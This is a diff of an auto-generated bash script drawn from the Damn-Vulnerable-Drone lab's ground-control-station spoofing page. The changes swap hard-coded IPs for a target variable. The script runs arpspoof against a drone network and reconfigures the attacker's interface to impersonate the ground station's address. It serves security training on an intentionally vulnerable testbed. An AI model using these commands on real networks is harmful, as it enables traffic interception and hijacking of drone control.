@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 # Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Ground-Control-Station-Spoofing.md
-# Created: 2025-11-23 15:43:26
+# Created: 2025-11-23 16:46:38
 # NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
 set -euo pipefail
 
@@ -29,12 +29,12 @@ log "[BLOCK 4] type=shell"
 ifconfig wlan0
 
 log "[BLOCK 5] type=shell"
-sudo arpspoof -i wlan0 -t 192.168.13.14 -r 192.168.13.1
+sudo arpspoof -i wlan0 -t ${TARGET_CC_WIFI}4 -r ${TARGET_CC_WIFI}
 
 log "[BLOCK 6] type=shell"
 nmcli connection modify "Drone_Wifi" ipv4.method manual \
-ipv4.addresses 192.168.13.14/24 \
-ipv4.gateway 192.168.13.1 \
+ipv4.addresses ${TARGET_CC_WIFI}4/24 \
+ipv4.gateway ${TARGET_CC_WIFI} \
 ipv4.dns "8.8.8.8 8.8.4.4"
 
 log "[BLOCK 7] type=shell"
@@ -42,8 +42,8 @@ nmcli connection down "Drone_Wifi" && nmcli connection up "Drone_Wifi"
 
 log "[BLOCK 8] type=shell"
 nmcli connection modify "Drone_Wifi" ipv4.method manual \
-ipv4.addresses 192.168.13.10/24 \
-ipv4.gateway 192.168.13.1 \
+ipv4.addresses ${TARGET_CC_WIFI}0/24 \
+ipv4.gateway ${TARGET_CC_WIFI} \
 ipv4.dns "8.8.8.8 8.8.4.4"
 nmcli connection down "Drone_Wifi" && nmcli connection up "Drone_Wifi"
 
